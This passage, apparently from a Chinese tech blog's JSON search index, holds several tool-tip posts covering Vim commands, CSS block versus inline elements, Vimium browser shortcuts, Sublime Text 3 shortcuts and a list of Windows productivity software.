你可以同时打开很多文件，使用这两个命令来切换下一个或上一个文件。（注：我喜欢使用:n到下一个文件） 花点时间熟悉一下上面的命令，一旦你掌握他们了，你就几乎可以干其它编辑器都能干的事了。但是到现在为止，你还是觉得使用vim还是有点笨拙，不过没关系，你可以进阶到第三级了。 第三级 – 更好，更强，更快在第三级，我们只谈那些和vi可以兼容的命令。 更好 下面，让我们看一下vim是怎么重复自己的： . → (小数点) 可以重复上一次的命令N → 重复某个命令N次 下面是一个示例，找开一个文件你可以试试下面的命令： 2dd → 删除2行 3p → 粘贴文本3次 100idesu [ESC] → 会写下 “desu desu desu desu desu desu desu desu desu desu desu desu desu desu desu desu desu desu desu desu desu desu desu desu desu desu desu desu desu desu desu desu desu desu desu desu desu desu desu desu desu desu desu desu desu desu desu desu desu desu desu desu desu desu desu desu desu desu desu desu desu desu desu desu desu desu desu desu desu desu desu desu desu desu desu desu desu desu desu desu desu desu desu desu desu desu desu desu desu desu desu desu desu desu desu desu desu desu desu desu “ . → 重复上一个命令—— 100 “desu “. → 重复 3 次 “desu” (注意：不是 300，你看，VIM多聪明啊). 更强 你要让你的光标移动更有效率，你一定要了解下面的这些命令，千万别跳过。 NG → 到第 N 行 （陈皓注：注意命令中的G是大写的，另我一般使用 : N 到第N行，如 :137 到第137行） gg → 到第一行。（陈皓注：相当于1G，或 :1） G → 到最后一行。 按单词移动： w → 到下一个单词的开头。 e → 到下一个单词的结尾。 如果你认为单词是由默认方式，那么就用小写的e和w。默认上来说，一个单词由字母，数字和下划线组成（注：程序变量） 如果你认为单词是由blank字符分隔符，那么你需要使用大写的E和W。（注：程序语句） 下面，让我们来说说最强的光标移动： % : 匹配括号移动，包括 (, {, [. （注：你需要把光标先移到括号上） 和 #: 匹配光标当前所在的单词，移动光标到下一个（或上一个）匹配单词（*是下一个，#是上一个） 相信我，上面这三个命令对程序员来说是相当强大的 更快 你一定要记住光标的移动，因为很多命令都可以和这些移动光标的命令连动。很多命令都可以如下来干： &lt;start position&gt;&lt;command&gt;&lt;end position&gt; 例如 0y$ 命令意味着： 0 → 先到行头 y → 从这里开始拷贝 $ → 拷贝到本行最后一个字符 你可可以输入 ye，从当前位置拷贝到本单词的最后一个字符。 你也可以输入 y2/foo 来拷贝2个 “foo” 之间的字符串。 还有很多时间并不一定你就一定要按y才会拷贝，下面的命令也会被拷贝： d (删除 ) v (可视化的选择) gU (变大写) gu (变小写) 注：可视化选择是一个很有意思的命令，你可以先按v，然后移动光标，你就会看到文本被选择，然后，你可能d，也可y，也可以变大写等 第四级 – Vim 超能力你只需要掌握前面的命令，你就可以很舒服的使用VIM了。但是，现在，我们向你介绍的是VIM杀手级的功能。下面这些功能是我只用vim的原因。 在当前行上移动光标: 0 ^ $ f F t T , ; 0 → 到行头 ^ → 到本行的第一个非blank字符 $ → 到行尾 g_ → 到本行最后一个不是blank字符的位置。 fa → 到下一个为a的字符处，你也可以fs到下一个为s的字符。 t, → 到逗号前的第一个字符。逗号可以变成其它字符。 3fa → 在当前行查找第三个出现的a。 F 和 T → 和 f 和 t 一样，只不过是相反方向。 注：还有一个很有用的命令是 dt” → 删除所有的内容，直到遇到双引号—— “。 区域选择 &lt;action&gt;a&lt;object&gt; 或 &lt;action&gt;i&lt;object&gt; 在visual 模式下，这些命令很强大，其命令格式为: &lt;action&gt;a&lt;object&gt; 和 &lt;action&gt;i&lt;object&gt; action可以是任何的命令，如 d (删除), y (拷贝), v (可以视模式选择)。 object 可能是： w 一个单词， W 一个以空格为分隔的单词， s 一个句字， p 一个段落。也可以是一个特别的字符：&quot;、 &#39;、 )、 }、 ]。假设你有一个字符串 (map (+) (&quot;foo&quot;)).而光标键在第一个 o 的位置。 vi” → 会选择 foo. va” → 会选择 “foo”. vi) → 会选择 “foo”. va) → 会选择(“foo”). v2i) → 会选择 map (+) (“foo”) v2a) → 会选择 (map (+) (“foo”)) 块操作: &lt;C-v&gt; 块操作，典型的操作： 0 &lt;C-v&gt; &lt;C-d&gt; I-- [ESC] ^ → 到行头 &lt;C-v&gt; → 开始块操作 &lt;C-d&gt; → 向下移动 (你也可以使用hjkl来移动光标，或是使用%，或是别的) I-- [ESC] → I是插入，插入“–”，按ESC键来为每一行生效 在Windows下的vim，你需要使用 &lt;C-q&gt; 而不是 &lt;C-v&gt; ， 是拷贝剪贴板 自动提示： &lt;C-n&gt; 和 &lt;C-p&gt; 在 Insert 模式下，你可以输入一个词的开头，然后按 &lt;C-p&gt;或是&lt;C-n&gt;，自动补齐功能就出现了…… 宏录制： qa 操作序列 q, @a, @@ qa 把你的操作记录在寄存器 a。 于是 @a 会replay被录制的宏。 @@ 是一个快捷键用来replay最新录制的宏。 在一个只有一行且这一行只有“1”的文本中，键入如下命令： qaYpq→ qa 开始录制 Yp 复制行. 增加1. q 停止录制. @a → 在1下面写下 2 @@ → 在2 正面写下3 现在做 100@@ 会创建新的100行，并把数据增加到 103. 可视化选择： v,V,&lt;C-v&gt; 前面，我们看到了 &lt;C-v&gt;的示例 （在Windows下应该是），我们可以使用 v 和 V。一但被选好了，你可以做下面的事： J → 把所有的行连接起来（变成一行） &lt; 或 &gt; → 左右缩进 = → 自动给缩进 （陈皓注：这个功能相当强大，我太喜欢了） 在所有被选择的行后加上点东西： 选中相关的行 (可使用 j 或 或是 /pattern 或是 % 等……) $ 到行最后 A, 输入字符串，按 ESC。 分屏: :split 和 vsplit. 下面是主要的命令，你可以使用VIM的帮助 :help split. :split → 创建分屏 (:vsplit创建垂直分屏) &lt;C-w&gt;&lt;dir&gt; : dir就是方向，可以是 hjkl 或是 ←↓↑→ 中的一个，其用来切换分屏。 &lt;C-w&gt;_ (或 |) : 最大化尺寸 (| 垂直分屏) &lt;C-w&gt;+ (或 -) : 增加尺寸 结束语 上面是最常用的90%的命令。 建议每天都学1到2个新的命令。 在两到三周后，你会感到vim的强大的。 有时候，学习VIM就像是在死背一些东西。 幸运的是，vim有很多很不错的工具和优秀的文档。 运行vimtutor直到你熟悉了那些基本命令。 其在线帮助文档中你应该要仔细阅读的是 :help usr_02.txt. 你会学习到诸如 !， 目录，寄存器，插件等很多其它的功能。 学习vim就像学弹钢琴一样，一旦学会，受益无穷 文章来源网络","categories":[{"name":"工欲善其事必先利其器","slug":"工欲善其事必先利其器","permalink":"https://ru23.com/categories/工欲善其事必先利其器/"}],"tags":[{"name":"Vim","slug":"Vim","permalink":"https://ru23.com/tags/Vim/"}]},{"title":"Vim使用摘要笔记","slug":"2016-03-Vim使用摘要笔记","date":"2016-03-19T01:04:38.000Z","updated":"2018-10-24T03:46:01.571Z","comments":true,"path":"note/2f66c6f7.html","link":"","permalink":"https://ru23.com/note/2f66c6f7.html","excerpt":"插入模式和退出VIM的方法VIM 具有 6 种基本模式和 5 种派生模式。","text":"插入模式和退出VIM的方法VIM 具有 6 种基本模式和 5 种派生模式。 基本模式：普通模式、插入模式、可视模式、选择模式、命令行模式和 Ex 模式； 派生模式：操作符等待模式、插入普通模式、插入可视模式、插入选择模式和替换模式 删除命令、数字的奥义、撤销和恢复命令 粘贴命令、替换命令、替换模式和修改命令 粘贴命令使用 p 命令可以将最后一次删除的内容粘贴到光标之后。（大写的 P 则是粘贴到光标之前） 这里需要注意的是：如果你需要粘贴的是整行为单位，那么 p 命令将在光标的下一行开始粘贴；如果你拷贝的是非整行的局部字符串，那么 p 命令将在光标后开始粘贴。 拷贝命令 其实我们用的最多的还是拷贝粘贴，VIM 用 y 命令实现拷贝。语法跟删除的 d 命令一样：d motion 其中的 motion 同样是用来表示操作范围的指令，即 yy 表示拷贝当前行，3yy 则表示拷贝 3 行；y$ 表示从光标所在的位置拷贝到行尾的所有字符；yG 则表示从光标所在行拷贝到文件末尾行的所有字符 拷贝完成之后同样使用 p 命令进行粘贴 替换命令 VIM 还提供了一个简单的替换命令：r 命令 r 用于替换光标所在的字符，做法是先将光标移动到需要替换的字符处，按一下 r 键，然后输入新的字符。注意，全程无需进入插入模式，也不会进入插入模式 替换模式 对于需要替换多个字符，更好的方案是直接进入替换模式。按下大写的 R 键，屏幕左下角出现 – REPLACE – 字样，说明你已经处于替换模式。此时输入字符可以连续替换光标及其后边的内容。 修改命令 修改跟替换是不一样的！修改跟替换是不一样的！ 修改会进入插入模式，替换不会进入插入模式！修改会进入插入模式，替换不会进入插入模式！ 修改命令我们使用 c 键来启动，格式是：c [number] motion motion 依然表示范围，[数字]依然拥有奥义，同样是可选的，加上数字表示重复执行多次 motion 范围… 事实上，修改 == 删除 + 进入插入模式 文件信息、跳转、定位括号和缩进有时候，你可能需要知道当前的文件信息，比如文件名，文件状态，文件的总行数，以及光标所在的相对位置 快捷键 ctrl + g 可以解决你的需求： 跳转 在 VIM 有两种方式可以将光标跳转到指定的位置： 行号 + G 行号 比如将光标跳转到第 333 行的位置，你就输入数字 333，再输入大写字母 G 即可见证奇迹；或者输入冒号（:）进入命令行模式，再输入数字 333，最后回车，也可以跳转到目的地 如果单独输入 G 键（前边没有输入数字），那么光标是直接去到文件的最后一行；如果输入两个小写 g，即 gg，则将光标跳转到文件的第一行。 定位括号 VIM 有个按键可以帮你快速定位到另一半括号，就是 % 键。将光标移动到 ()，[]，{}，中的任何一半括号上，按下 % 键，便可看到此时光标已经跳转到另外一半的括号上了 缩进 在编写代码的时候我们经常需要对代码进行缩进，VIM 可以使用尖括号（&amp;lt; 或 &amp;gt;）来控制缩进，我们常用的就是两个同方向的尖括号表示将光标所在的语句进行缩进和反缩进操作。很明显 &amp;gt;&amp;gt; 表示缩进，而 &amp;lt;&amp;lt; 则表示反缩进 不过行数一多……到底要缩进多少行就成了一个问题……这时，你可以按一下 v 进入可视模式（左下角出现 -- VISUAL -- 字样），然后通过 h、j、k、l 或 其他 motion 来移动你的光标，此时光标所到之处必被一道亮光所包围（表示被选中），选择好需要缩进的目标后，只需按一下 &amp;gt; 即可完成任务 搜索命令和替换命令 搜索命令 最后提个醒：在搜索命令中，.、*、[、]、^、%、/、?、~ 和 $ 这 10 个字符有着特殊意义，所以在使用这些字符的时候要在前面加上一个反斜杠（\\），比如你要搜索问号，则输入 /\\? 替换命令 搜索在很多情况下都是为了替换 通过搜索功能，我们将光标定位到目标位置，如果你确定这个目标是可恶的，需要被替换的，你可以输入 :s/old/new，这样即可将光标所在行的第一个 old 替换为 new；你如果输入的是 :s/old/new/g，则表示将光标所在行的所有 old 替换为 new。 输入 : %s/old/new/g 表示替换整个文件中每个匹配的字符串输入 : %s/old/new/gc 替换提示信息输入 : 5,13s/old/new/g 替换第 5 行到第 13 行之间的所有 XX 执行shell命令、文件另存为、合并文件和打开多个文件 执行shell命令 想知道当前 / 下边有哪些目录和文件，在 VIM 中你可以输入 :!ls 在输入冒号（:）进入命令行模式，输入感叹号（!），在其后便可以加上 shell 命令。此后 VIM 将临时跳转回 shell，并执行命令。再次按下 Enter 键回到 VIM 文件另存为 输入 :w 新文件名 文件另存为 如：输入 :w test2 该命令会以 test2 为文件名拷贝保存整个 test 文件 局部内容另存为 言下之意就是，VIM 可以将文件中的局部文本另存为一个新的文件 这就需要你进入一种新的模式，叫：可视模式 在普通模式中按下 V 键即进入可视模式，进入后左下角显示 VISUAL 此时光标的位置开始为选中状态，你可以通过任何移动或范围的按键来移动光标，光标所到之处皆为选中状态（h、j、k、l 移动光标，$ 去到行尾，0 去到行首……）： 选好范围之后的操作就跟“文件另存为”一样了；按下冒号（:）屏幕左下方出现 :&#39;&amp;lt;,&#39;&amp;gt;现在请输入 w test2；表示新建一个 test2 文件，并将选中的内容单独存放进去。 这里有个问题，如果路径中已经存在 test2 文件，那么 VIM 会提醒你需要加感叹号（!）才能强制覆盖文件。即输入 w! test2 合并文件 所谓合并文件，便是在 VIM 打开的一个文件中读取并置入另一个文件 只需要输入冒号（:）进入命令行模式，然后输入 r 文件名 即可将指定文件的内容读取并置入到光标的下一行中 打开多个文件 VIM 还可以同时打开多个文件，并且允许你通过水平或垂直的方式并排它们 VIM 使用 –o 或 –O 选项打开多个文件，其中 –o 表示垂直并排，-O 表示水平并排；例如 vim -o lesson4 lesson5 lesson6 打开后默认光标是落在第一个文件中的，此时之前学过的所有命令都可以上，不过仅限于第一个文件。那如何将焦点（光标）切换到另一个文件中呢？很简单，使用 ctrl + w + w 将光标切换到下一个文件；或者使用 ctrl + w + 方向（方向键或 h、j、k、l） 退出文件的话可以使用原来的 q、q!、wq 或者 ZZ（shirt + z + z） 退出多个文件：命令的后边加上小写 a，则表示退出动作是针对所有的（ALL）：qa、qa!、wqa 其他总结 【vim窗口管理】 打开NerdTRee(：NER--&gt;tab) 多屏幕移动光标左侧 ctrl+w+h 右侧 ctrl+w+l 在目录结构打开文件 i 0 展开目录结构 自动补全：ctrl+P（基于单词） 【配置VIM】 临时的配置 ：set 或者 ：set all 永久的配置 ~/.vimrcor ~/.exrc 一些通用的配置 ： :set number :set autoindent :set textwidth=65(vim only) :set wrapmargin=15 :set ignorecase vim 使用tip 编写python程序 自动插入头信息： #!/usr/bin/env python # coding=utf-8 输入.或按TAB键会触发代码补全功能:w保存代码之后会自动检查代码错误与规范按F6可以按pep8格式对代码格式优化按F5可以一键执行代码多窗口操作 使用:sp + 文件名 可以水平分割窗口使用:vs + 文件名 可以垂直分割窗口使用Ctrl + w 可以快速在窗口间切换 编写markdown文件 编写markdown文件(*.md)的时候，在normal模式下按 md 即可在当前目录下生成相应的html文件 生成之后还是在normal模式按fi可以使用firefox打开相应的html文件预览当然也可以使用万能的F5键来一键转换并打开预览如果打开过程中屏幕出现一些混乱信息，可以按Ctrl + l来恢复快速注释 附录 vim配置文件和插件 下载地址：超强vim配置文件 运行截图 vim键位图–重要 入门版 经典版【推荐】 进阶版 增强版","categories":[{"name":"工欲善其事必先利其器","slug":"工欲善其事必先利其器","permalink":"https://ru23.com/categories/工欲善其事必先利其器/"}],"tags":[{"name":"Vim","slug":"Vim","permalink":"https://ru23.com/tags/Vim/"}]},{"title":"CSS块级元素和行内元素","slug":"2016-03-CSS块级元素和行内元素","date":"2016-03-16T08:24:08.000Z","updated":"2018-10-24T03:46:01.507Z","comments":true,"path":"note/7aeb0108.html","link":"","permalink":"https://ru23.com/note/7aeb0108.html","excerpt":"HTML中的元素可分为两种类型：块级元素和行级元素。这些元素的类型是通过文档类型定义（DTD）来指明。块级元素：显示在一块内，会自动换行，元素会从上到下垂直排列，各自占一行，如p,ul,form,div等标签元素。行内元素：元素在一行内水平排列，高度由元素的内容决定，height属性不起作用，如span,input等元素。","text":"HTML中的元素可分为两种类型：块级元素和行级元素。这些元素的类型是通过文档类型定义（DTD）来指明。块级元素：显示在一块内，会自动换行，元素会从上到下垂直排列，各自占一行，如p,ul,form,div等标签元素。行内元素：元素在一行内水平排列，高度由元素的内容决定，height属性不起作用，如span,input等元素。 一、块级元素：block element 每个块级元素默认占一行高度，一行内添加一个块级元素后无法一般无法添加其他元素（float浮动后除外）。两个块级元素连续编辑时，会在页面自动换行显示。块级元素一般可嵌套块级元素或行内元素；块级元素一般作为容器出现，用来组织结构，但并不全是如此。有些块级元素，如只能包含块级元素。 DIV 是最常用的块级元素，元素样式的display:block都是块级元素。它们总是以一个块的形式表现出来，并且跟同级的兄弟块依次竖直排列，左右撑满。 二、行内元素：inline element 也叫内联元素、内嵌元素等；行内元素一般都是基于语义级(semantic)的基本元素，只能容纳文本或其他内联元素，常见内联元素 “a”。比如 SPAN 元素，IFRAME元素和元素样式的display : inline的都是行内元素。例如文字这类元素，各个字母 之间横向排列，到最右端自动折行。 三、block（块）元素的特点: ①、总是在新行上开始；②、高度，行高以及外边距和内边距都可控制；③、宽度缺省是它的容器的100%，除非设定一个宽度。④、它可以容纳内联元素和其他块元素 四、inline元素的特点 ①、和其他元素都在一行上；②、高，行高及外边距和内边距不可改变；③、宽度就是它的文字或图片的宽度，不可改变④、内联元素只能容纳文本或者其他内联元素 对行内元素，需要注意如下: 设置宽度width 无效。 设置高度height 无效，可以通过line-height来设置。 设置margin只有左右margin有效，上下无效。设置padding只有左右padding有效，上下则无效。注意元素范围是增大了，但是对元素周围的内容是没影响的。 五、常见的块状元素 address – 地址blockquote – 块引用center – 举中对齐块dir – 目录列表div – 常用块级容易，也是CSS layout的主要标签dl – 定义列表fieldset – form控制组form – 交互表单h1 – 大标题h2 – 副标题h3 – 3级标题h4 – 4级标题h5 – 5级标题h6 – 6级标题hr – 水平分隔线isindex – input promptmenu – 菜单列表noframes – frames可选内容，（对于不支持frame的浏览器显示此区块内容noscript – 可选脚本内容（对于不支持script的浏览器显示此内容）ol – 有序表单p – 段落pre – 格式化文本table – 表格ul – 无序列表 六、常见的内联元素 a – 锚点abbr – 缩写acronym – 首字b – 粗体(不推荐)bdo – bidi overridebig – 大字体br – 换行cite – 引用code – 计算机代码(在引用源码的时候需要)dfn – 定义字段em – 强调font – 字体设定(不推荐)i – 斜体img – 图片input – 输入框kbd – 定义键盘文本label – 表格标签q – 短引用s – 中划线(不推荐)samp – 定义范例计算机代码select – 项目选择small – 小字体文本span – 常用内联容器，定义文本内区块strike – 中划线strong – 粗体强调sub – 下标sup – 上标textarea – 多行文本输入框tt – 电传文本u – 下划线 七，可变元素 可变元素为根据上下文语境决定该元素为块元素或者内联元素。 applet - java applet button - 按钮 del - 删除文本 iframe - inline frame ins - 插入的文本 map - 图片区块(map) object - object对象 script - 客户端脚本 八、行内元素与块级元素有什么不同 区别一： 块级：块级元素会独占一行，默认情况下宽度自动填满其父元素宽度 行内：行内元素不会独占一行，相邻的行内元素会排在同一行。其宽度随内容的变化而变化。 区别二： 块级：块级元素可以设置宽高 行内：行内元素不可以设置宽高 区别三： 块级：块级元素可以设置margin，padding 行内：行内元素水平方向的margin-left; margin-right; padding-left; padding-right;可以生效。但是竖直方向的margin-bottom; margin-top; padding-top; padding-bottom;却不能生效。 区别四： 块级：display:block; 行内：display:inline; 可以通过修改display属性来切换块级元素和行内元素","categories":[{"name":"Front-End","slug":"Front-End","permalink":"https://ru23.com/categories/Front-End/"}],"tags":[{"name":"CSS","slug":"CSS","permalink":"https://ru23.com/tags/CSS/"}]},{"title":"Vimium键盘流操作","slug":"2016-03-Vimium键盘流操作","date":"2016-03-15T13:16:55.000Z","updated":"2018-10-24T03:46:01.569Z","comments":true,"path":"note/f1030007.html","link":"","permalink":"https://ru23.com/note/f1030007.html","excerpt":"键盘流操作Vimium是一个Chrome的插件，可以在google的web app store中搜索并安装。Vimium可使chrome脱离鼠标，让网页浏览更高效，在简单的熟悉后的确感觉高效了很多，手再也不用离开键盘了 shift+/ 显示命令帮助，记不得就按这个符号，弹出的窗口如下：","text":"键盘流操作Vimium是一个Chrome的插件，可以在google的web app store中搜索并安装。Vimium可使chrome脱离鼠标，让网页浏览更高效，在简单的熟悉后的确感觉高效了很多，手再也不用离开键盘了 shift+/ 显示命令帮助，记不得就按这个符号，弹出的窗口如下： Vimium常用快捷键(注：区分大小写)j : 向下移动H：回到上一个历史页面L：回到下一个历史页面J：跳到左边标签页K：跳到右边标签页t：创建新的标签页（ctrl+t）d : 向下移动一个页面 Scroll a page downu : 向上移动一个页面 Scroll a page upgg : 移到页面顶部 Scroll to the top of the pageG : 移到页面底部 Scroll to the bottom of the pagex：关闭当前标签页X：恢复关闭的标签页r : 刷新 Reload the pagegs : 查看网页源码 View page sourceyy : copy当前页面url Copy the current URL to the clipboardyf : 拷贝当前页面的连接到剪切板 Copy a link URL to the clipboardyt : 创建当前页面的一个副本(copy当前路径在新Tab中打开)-Duplicate current tabYT : 罗列出当前所有Tab页(并提供索引)，可任你选择性跳转，帅；p : 在当前标签页中打开剪切板中的链接 Open the clipboard’s URL in the current tabP : 在新的标签页中打开剪切板中的链接Open the clipboard’s URL in a new tabgu : Go up the URL hierarchy（例如，URL为http://blog.net/article/8021689 ，按下gu后，转到http://blog.net/article/，回到该网站该访问者主页）gU : Go to root of current URL hierarchy (类似gu，回到根URL页 http://blog.net) f : 在当前标签页中打开链接 Open a link in the current tabF : 在新标签页中打开链接 Open a link in a new tab 如果想点击页面上的某个连接时，在命令模式下，按 f 键之后就会对页面上所有可点击的连接或按钮进行编码，然后再输入相应的编码完成点击或者复制连接操作 o : 在当前页面中打开URL，书签和历史记录 Open URL, bookmark, or history entryO : 在新标签页中打开URL，书签和历史记录Open URL, bookmark, history entry, in a new tabT : 搜索打开的标签页 Search through your open tabsb : 打开书签 Open a bookmarkB : 在新标签中打开书签 Open a bookmark in a new tab在命令行模式，按下b(B)，可以对标签进行检索，检索结果通过tab键进行选择，回车即可打开标签。 /：查找（ctrl+f）i : 进入输入模式 Enter insert modeesc：退出","categories":[{"name":"工欲善其事必先利其器","slug":"工欲善其事必先利其器","permalink":"https://ru23.com/categories/工欲善其事必先利其器/"}],"tags":[{"name":"Tools","slug":"Tools","permalink":"https://ru23.com/tags/Tools/"}]},{"title":"Sublime Text3常用快捷键","slug":"2016-03-sublime-Text3常用快捷键","date":"2016-03-15T12:13:14.000Z","updated":"2018-10-24T03:46:01.540Z","comments":true,"path":"note/e8fd76aa.html","link":"","permalink":"https://ru23.com/note/e8fd76aa.html","excerpt":"选择类 Ctrl+D 选中光标所占的文本，继续操作则会选中下一个相同的文本 Alt+F3 选中文本按下快捷键，即可一次性选择全部的相同文本进行同时编辑。举个栗子：快速选中并更改所有相同的变量名、函数名等 Ctrl+L 选中整行，继续操作则继续选择下一行，效果和 Shift+↓ 效果一样。 Ctrl+Shift+L 先选中多行，再按下快捷键，会在每行行尾插入光标，即可同时编辑这些行。 Ctrl+Shift+M 选择括号内的内容（继续选择父括号）。举个栗子：快速选中删除函数中的代码，重写函数体代码或重写括号内里的内容 Ctrl+M 光标移动至括号内结束或开始的位置。 Ctrl+Enter 在下一行插入新行。举个栗子：即使光标不在行尾，也能快速向下插入一行。 Ctrl+Shift+Enter 在上一行插入新行。举个栗子：即使光标不在行首，也能快速向上插入一行。 Ctrl+Shift+[ 选中代码，按下快捷键，折叠代码。 Ctrl+Shift+] 选中代码，按下快捷键，展开代码。 Ctrl+K+0 展开所有折叠代码。 Ctrl+← 向左单位性地移动光标，快速移动光标。 Ctrl+→ 向右单位性地移动光标，快速移动光标。 shift+↑ 向上选中多行。 shift+↓ 向下选中多行。 Shift+← 向左选中文本。 Shift+→ 向右选中文本。 Ctrl+Shift+← 向左单位性地选中文本。 Ctrl+Shift+→ 向右单位性地选中文本。 Ctrl+Shift+↑ 将光标所在行和上一行代码互换（将光标所在行插入到上一行之前）。 Ctrl+Shift+↓ 将光标所在行和下一行代码互换（将光标所在行插入到下一行之后）。 Ctrl+Alt+↑ 向上添加多行光标，可同时编辑多行。 Ctrl+Alt+↓ 向下添加多行光标，可同时编辑多行。","text":"选择类 Ctrl+D 选中光标所占的文本，继续操作则会选中下一个相同的文本 Alt+F3 选中文本按下快捷键，即可一次性选择全部的相同文本进行同时编辑。举个栗子：快速选中并更改所有相同的变量名、函数名等 Ctrl+L 选中整行，继续操作则继续选择下一行，效果和 Shift+↓ 效果一样。 Ctrl+Shift+L 先选中多行，再按下快捷键，会在每行行尾插入光标，即可同时编辑这些行。 Ctrl+Shift+M 选择括号内的内容（继续选择父括号）。举个栗子：快速选中删除函数中的代码，重写函数体代码或重写括号内里的内容 Ctrl+M 光标移动至括号内结束或开始的位置。 Ctrl+Enter 在下一行插入新行。举个栗子：即使光标不在行尾，也能快速向下插入一行。 Ctrl+Shift+Enter 在上一行插入新行。举个栗子：即使光标不在行首，也能快速向上插入一行。 Ctrl+Shift+[ 选中代码，按下快捷键，折叠代码。 Ctrl+Shift+] 选中代码，按下快捷键，展开代码。 Ctrl+K+0 展开所有折叠代码。 Ctrl+← 向左单位性地移动光标，快速移动光标。 Ctrl+→ 向右单位性地移动光标，快速移动光标。 shift+↑ 向上选中多行。 shift+↓ 向下选中多行。 Shift+← 向左选中文本。 Shift+→ 向右选中文本。 Ctrl+Shift+← 向左单位性地选中文本。 Ctrl+Shift+→ 向右单位性地选中文本。 Ctrl+Shift+↑ 将光标所在行和上一行代码互换（将光标所在行插入到上一行之前）。 Ctrl+Shift+↓ 将光标所在行和下一行代码互换（将光标所在行插入到下一行之后）。 Ctrl+Alt+↑ 向上添加多行光标，可同时编辑多行。 Ctrl+Alt+↓ 向下添加多行光标，可同时编辑多行。 多重选择功能Sublime Text 2为我们做了很多大好事，最大的好事就是多重选择功能。攻城师们用的静态语言（如Java）给文本编辑者带来方便，特别是保留变量。多重选择功能甚至在编辑领域发扬闪亮之处，掌握复选功能会使攻城师从文本编辑中得到无以伦比的满足感和成就感 六种方法来初始化多重选择功能： Add next/previous line 增加下一行／向后命令(在OS X下用Cmd+Ctrl+up/down、Linux/Windows下用Ctrl+Alt+up/down) Cmd/Ctrl ＋ 点击加入鼠标光标 Split into lines | 将选区转换成多个单行选区(Cmd/Ctrl+Shift+L) Alt + 拖拽(OS X下)或者Shift＋右键拖拽(Linux/Windows下) Quick Add Next | 快速添加下一个(Cmd/Ctrl+D) Quick Find All | 快速寻找所有(OS X下Cmd+Ctrl+G，Linux/Windows下Alt+F3) 最后的那个用得最多，因为即使不用鼠标也可以快速并容易控制所选内容。用这个功能，你还可以下次继续调用当前所选内容。这让变量更名变得易如反掌 编辑类 Ctrl+J 合并选中的多行代码为一行。举个栗子：将多行格式的CSS属性合并为一行。 Ctrl+Shift+D 复制光标所在整行，插入到下一行。 Tab 向右缩进。 Shift+Tab 向左缩进。 Ctrl+Shift+UP 与上行互换 Ctrl+Shift+DOWN 与下行互换 Ctrl+K+K 从光标处开始删除代码至行尾。 Ctrl+Shift+K 删除整行。 Ctrl+/ 注释单行。 Ctrl+Shift+/ 注释多行。 Ctrl+K+U 转换大写。 Ctrl+K+L 转换小写。 Ctrl+Z 撤销。 Ctrl+Y 恢复撤销。 Ctrl+U 软撤销，感觉和 Gtrl+Z 一样。 Ctrl+F2 设置书签 Ctrl+T 左右字母互换。 F6 单词检测拼写 搜索类 Ctrl+F 打开底部搜索框，查找关键字。 Ctrl+shift+F 在文件夹内查找，与普通编辑器不同的地方是sublime允许添加多个文件夹进行查找，略高端，未研究。 Ctrl+P打开搜索框。举个栗子：1、输入当前项目中的文件名，快速搜索文件，2、输入@和关键字，查找文件中函数名，3、输入：和数字，跳转到文件中该行代码，4、输入#和关键字，查找变量名。 Ctrl+G 打开搜索框，自动带：，输入数字跳转到该行代码。举个栗子：在页面代码比较长的文件中快速定位。 Ctrl+R 打开搜索框，自动带@，输入关键字，查找文件中的函数名。举个栗子：在函数较多的页面快速查找某个函数。 Ctrl+： 打开搜索框，自动带#，输入关键字，查找文件中的变量名、属性名等。 Ctrl+Shift+P 打开命令框。场景栗子：打开命名框，输入关键字，调用sublimetext或插件的功能，例如使用package安装插件。 Esc 退出光标多行选择，退出搜索框，命令框等。 显示类 Ctrl+Tab 按文件浏览过的顺序，切换当前窗口的标签页。 Ctrl+PageDown 向左切换当前窗口的标签页。 Ctrl+PageUp 向右切换当前窗口的标签页。 Alt+Shift+1 窗口分屏，恢复默认1屏（非小键盘的数字） Alt+Shift+2 左右分屏-2列 Alt+Shift+3 左右分屏-3列 Alt+Shift+4 左右分屏-4列 Alt+Shift+5 等分4屏 Alt+Shift+8 垂直分屏-2屏 Alt+Shift+9 垂直分屏-3屏 Ctrl+K+B 开启/关闭侧边栏。 F11 全屏模式 Shift+F11 免打扰模式","categories":[{"name":"工欲善其事必先利其器","slug":"工欲善其事必先利其器","permalink":"https://ru23.com/categories/工欲善其事必先利其器/"}],"tags":[{"name":"sublime","slug":"sublime","permalink":"https://ru23.com/tags/sublime/"}]},{"title":"windows下提升效率必备软件[转]","slug":"2016-03-windows下提升效率必备软件-转","date":"2016-03-15T10:42:30.000Z","updated":"2018-10-24T03:46:01.589Z","comments":true,"path":"note/f9a8244c.html","link":"","permalink":"https://ru23.com/note/f9a8244c.html","excerpt":"提升效率必备软件 AutoHotKey: 神器！神器！神器 Listary： 本地搜索神器，当然还有别的作用，More&amp;More。 Launchy :快速启动安装的应用程序，老而弥坚，有丝Mac下Spotlight之风； Chrome: Web世界里的神，的神，神。偏爱ing；如虎添翼，效率必备：Vimium~让您的Chrome起飞。 SublimeText3： 编码垒字的神器，还能览图/文件对比/…,偏爱 Picasa3: 图片查看器中的佼佼者，偏爱ing。姑姑出品，必属精品！ Clover： 在Win下必备，快速打开文件管理 Foxmail： 必备 为知笔记/有道云笔记 Beyond Compare : 文件比较器; 此款为所接触中最佳。 Cmder: windows下cmd的替换工具,支持PowerShell;同比还有PowerShell，ConEmu 等。自荐笔者总结的：Win下必备神器之Cmder。 作业部落客户端:开启卓越写作之旅,支持全平台＋离线使用，一键发布文稿，社交化批注。身材苗条，面容姣好，免费Markdown书写平台的魅力战斗机。 网易云音乐: 初遇QQ音乐,处过天天动听,恋过酷狗，上过酷我，一夜情过千千静听,移情过虾米，和豆瓣FM好过，同百度随心听约过,最后，发现音乐的世界,还得是你～网易云音乐。","text":"提升效率必备软件 AutoHotKey: 神器！神器！神器 Listary： 本地搜索神器，当然还有别的作用，More&amp;More。 Launchy :快速启动安装的应用程序，老而弥坚，有丝Mac下Spotlight之风； Chrome: Web世界里的神，的神，神。偏爱ing；如虎添翼，效率必备：Vimium~让您的Chrome起飞。 SublimeText3： 编码垒字的神器，还能览图/文件对比/…,偏爱 Picasa3: 图片查看器中的佼佼者，偏爱ing。姑姑出品，必属精品！ Clover： 在Win下必备，快速打开文件管理 Foxmail： 必备 为知笔记/有道云笔记 Beyond Compare : 文件比较器; 此款为所接触中最佳。 Cmder: windows下cmd的替换工具,支持PowerShell;同比还有PowerShell，ConEmu 等。自荐笔者总结的：Win下必备神器之Cmder。 作业部落客户端:开启卓越写作之旅,支持全平台＋离线使用，一键发布文稿，社交化批注。身材苗条，面容姣好，免费Markdown书写平台的魅力战斗机。 网易云音乐: 